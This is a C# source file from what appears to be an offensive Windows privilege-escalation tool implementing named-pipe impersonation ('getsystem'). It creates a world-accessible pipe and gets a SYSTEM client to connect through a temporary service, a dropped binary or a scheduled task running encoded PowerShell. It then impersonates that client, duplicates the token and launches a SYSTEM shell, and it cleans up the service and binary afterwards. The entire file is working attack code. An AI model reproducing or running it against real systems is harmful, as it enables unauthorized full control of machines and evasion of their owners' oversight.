using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using NamedPipeImpersonation.Interop;

namespace NamedPipeImpersonation.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool GetSystemWithNamedPipe(string command)
        {
            var bSuccess = false;
            var bIsImpersonated = false;

            do
            {
                int nErrorCode;
                string pipeMessage;
                var hPrimaryToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                    lpDesktop = @"Winsta0\Default"
                };
                var creationFlags = PROCESS_CREATION_FLAGS.None;
                var pipeSecurity = new PipeSecurity();
                var accessRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
                pipeSecurity.AddAccessRule(accessRule);

                if (Helpers.IsCurrentProcessInJob())
                    creationFlags |= PROCESS_CREATION_FLAGS.CreateBreakawayFromJob;

                Globals.ConnectionEvent = NativeMethods.CreateEvent(IntPtr.Zero, true, false, null);

                if (Globals.ConnectionEvent == IntPtr.Zero)
                {
                    nErrorCode = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create event object for pipe connection.");
                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(nErrorCode, false));
                    break;
                }

                Globals.ThreadCompletionEvent = NativeMethods.CreateEvent(IntPtr.Zero, true, false, null);

                if (Globals.ThreadCompletionEvent == IntPtr.Zero)
                {
                    nErrorCode = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create event object for thread completion.");
                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(nErrorCode, false));
                    break;
                }

                Console.WriteLine("[*] Trying to enable required privileges.");

                bSuccess = Utilities.EnableTokenPrivileges(
                    new List<string> { Win32Consts.SE_IMPERSONATE_NAME },
                    out Dictionary<string, bool> adjustedPrivs);

                foreach (var priv in adjustedPrivs)
                {
                    if (priv.Value)
                        Console.WriteLine("[+] {0} is enabled successfully.", priv.Key);
                    else
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                if (!bSuccess)
                    break;

                using (var pipeServer = new NamedPipeServerStream(
                    Globals.ServiceName,
                    PipeDirection.InOut,
                    100,
                    PipeTransmissionMode.Byte,
                    PipeOptions.None,
                    1024,
                    1024,
                    pipeSecurity))
                {
                    Console.WriteLine(@"[*] Created Named Pipe Server @ \\.\pipe\{0}", Globals.ServiceName);

                    using (var pipeReader = new StreamReader(pipeServer))
                    using (var hPipe = pipeServer.SafePipeHandle)
                    {
                        var clientThread = new Thread(new ThreadStart(ClientThreadProc));

                        Console.WriteLine("[*] Waiting for client connection...");

                        clientThread.Start();
                        pipeServer.WaitForConnection();
                        pipeMessage = pipeReader.ReadToEnd();
                        NativeMethods.NtSetEvent(Globals.ConnectionEvent, out int _);
                        NativeMethods.NtWaitForSingleObject(Globals.ThreadCompletionEvent, true, IntPtr.Zero);

                        if (string.Compare(pipeMessage, "timeout", true) == 0)
                        {
                            Console.WriteLine("[-] Timeout. Maybe blocked by anti-virus.");
                        }
                        else if (NativeMethods.ImpersonateNamedPipeClient(hPipe))
                        {
                            bIsImpersonated = (Environment.UserName.Length != 0);

                            if (bIsImpersonated)
                            {
                                string accountName;
                                Helpers.GetTokenUserName(out string upn, out string domain, out string stringSid, out SID_NAME_USE _);

                                if (!string.IsNullOrEmpty(upn) && !string.IsNullOrEmpty(domain))
                                    accountName = string.Format(@"{0}\{1}", domain, upn);
                                else if (!string.IsNullOrEmpty(upn))
                                    accountName = upn;
                                else if (!string.IsNullOrEmpty(domain))
                                    accountName = domain;
                                else
                                    accountName = "N/A";

                                if (string.IsNullOrEmpty(stringSid))
                                    stringSid = "N/A";

                                Console.WriteLine("[+] Impersonated as \"{0}\" (SID: {1}).", accountName, stringSid);

                                bSuccess = NativeMethods.DuplicateTokenEx(
                                    WindowsIdentity.GetCurrent().Token,
                                    ACCESS_MASK.MAXIMUM_ALLOWED,
                                    IntPtr.Zero,
                                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                                    TOKEN_TYPE.TokenPrimary,
                                    out hPrimaryToken);

                                if (!bSuccess)
                                {
                                    hPrimaryToken = IntPtr.Zero;
                                    nErrorCode = Marshal.GetLastWin32Error();
                                    Console.WriteLine("[-] Failed to get primary SYSTEM token.");
                                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(nErrorCode, false));
                                }
                            }
                            else
                            {
                                Console.WriteLine("[-] Failed to named pipe impersonation.");
                            }
                        }
                        else
                        {
                            nErrorCode = Marshal.GetLastWin32Error();
                            Console.WriteLine("[-] Failed to named pipe impersonation.");
                            Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(nErrorCode, false));
                        }
                    }
                }

                if (!bIsImpersonated || (hPrimaryToken == IntPtr.Zero))
                    break;

                Console.WriteLine("[*] Trying to spawn token assigned shell.");

                bSuccess = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    command,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    creationFlags,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInformation);
                NativeMethods.NtClose(hPrimaryToken);

                if (!bSuccess)
                {
                    nErrorCode = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(nErrorCode, false));
                }
                else
                {
                    Console.WriteLine("[+] SYSTEM shell is executed successfully.");

                    NativeMethods.NtWaitForSingleObject(processInformation.hThread, true, IntPtr.Zero);
                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
            } while (false);

            if (Globals.ConnectionEvent != IntPtr.Zero)
                NativeMethods.NtClose(Globals.ConnectionEvent);

            if (Globals.ThreadCompletionEvent != IntPtr.Zero)
                NativeMethods.NtClose(Globals.ThreadCompletionEvent);

            if (bIsImpersonated)
                NativeMethods.RevertToSelf();
            else
                Console.WriteLine("[-] Failed to GetSystem.");

            Console.WriteLine("[*] Done.");

            return bSuccess;
        }


        private static void ClientThreadProc()
        {
            NTSTATUS ntstatus;
            bool bSuccess;
            var hService = IntPtr.Zero;
            var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
            var bUseService = (Globals.MethodId == PipeClientMethodType.CmdService) ||
                (Globals.MethodId == PipeClientMethodType.Dropper);

            for (int i = 0; i < 10000; i++)
            {
                foreach (var f in System.IO.Directory.EnumerateFiles(@"\\.\pipe"))
                {
                    if (string.Compare(System.IO.Path.GetFileName(f), Globals.ServiceName, true) == 0)
                    {
                        Globals.PipeFound = true;
                        break;
                    }
                }

                if (Globals.PipeFound)
                    break;
            }

            if (bUseService)
            {
                string binpath;

                if (Globals.MethodId == PipeClientMethodType.CmdService)
                {
                    binpath = string.Format(@"{0} /c echo {1} > \\localhost\pipe\{1}",
                        Environment.GetEnvironmentVariable("COMSPEC"),
                        Globals.ServiceName);
                }
                else
                {
                    try
                    {
                        Globals.BinaryPath = string.Format(@"{0}\PrivFuPipeClient.exe", Path.GetTempPath().TrimEnd('\\'));
                        File.WriteAllBytes(Globals.BinaryPath, Globals.BinaryData);
                    }
                    catch
                    {
                        Console.WriteLine("[!] Failed to create service binary.");
                    }

                    binpath = string.Format(@"{0} {1}", Globals.BinaryPath, Globals.ServiceName);
                }

                Console.WriteLine("[*] Trying to create and start named pipe client service.");
                Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);
                Console.WriteLine("    [*] Binary Path  : {0}", binpath);

                hService = Utilities.StartNamedPipeClientService(binpath);

                if (hService == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to start named pipe client service.");
                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                }
                else
                {
                    Console.WriteLine("[+] Named pipe client service is started successfully.");
                }
            }
            else if (Globals.MethodId == PipeClientMethodType.ScheduledTask)
            {
                var poshCode = string.Format(Globals.PoshTemplate, Globals.ServiceName);
                var args = string.Format("-EncodedCommand {0}",
                    Convert.ToBase64String(Encoding.Unicode.GetBytes(poshCode)));
                var binpath = "powershell.exe";

                Console.WriteLine("[*] Trying to create and start a SYSTEM task.");
                Console.WriteLine("    [*] Task Name  : {0}", Globals.ServiceName);
                Console.WriteLine("    [*] Executable : {0}", binpath);
                Console.WriteLine("    [*] Arguments  : {0}", args);

                bSuccess = Utilities.CreateSystemExecTask(
                    Globals.ServiceName,
                    binpath,
                    args,
                    out Exception exception);

                if (bSuccess)
                    Console.WriteLine("[+] SYSTEM task is created, run and deleted successfully.");
                else
                    Console.WriteLine("[-] Failed to create SYSTEM task: {0}", exception.Message);
            }

            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectionEvent, false, in timeout);

            if (ntstatus == Win32Consts.STATUS_TIMEOUT)
            {
                try
                {
                    using (var pipeClient = new NamedPipeClientStream(".", Globals.ServiceName, PipeDirection.Out))
                    {
                        var message = Encoding.ASCII.GetBytes("timeout");
                        pipeClient.Connect(3000);
                        pipeClient.Write(message, 0, message.Length);
                    }
                }
                catch { }
            }

            if (bUseService)
            {
                if (hService != IntPtr.Zero)
                {
                    Console.WriteLine("[*] Deleting named pipe client service.");

                    if (!NativeMethods.DeleteService(hService))
                    {
                        Console.WriteLine("[-] Failed to delete named pipe client servce (Service Name = {0}).", Globals.ServiceName);
                        Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                    }
                    else
                    {
                        Console.WriteLine("[+] Named pipe client service is deleted successfully.");
                    }

                    NativeMethods.CloseServiceHandle(hService);
                }

                try
                {
                    if (File.Exists(Globals.BinaryPath))
                    {
                        Console.WriteLine("[*] Deleting service binary.");
                        File.Delete(Globals.BinaryPath);
                        Console.WriteLine("[+] Service binary is deleted successfully.");
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Failed to delete dropper binary. Delete it mannually.");
                    Console.WriteLine("    [*] Binary Path : {0}", Globals.BinaryPath);
                }
            }

            NativeMethods.NtSetEvent(Globals.ThreadCompletionEvent, out int _);
        }
    }
}
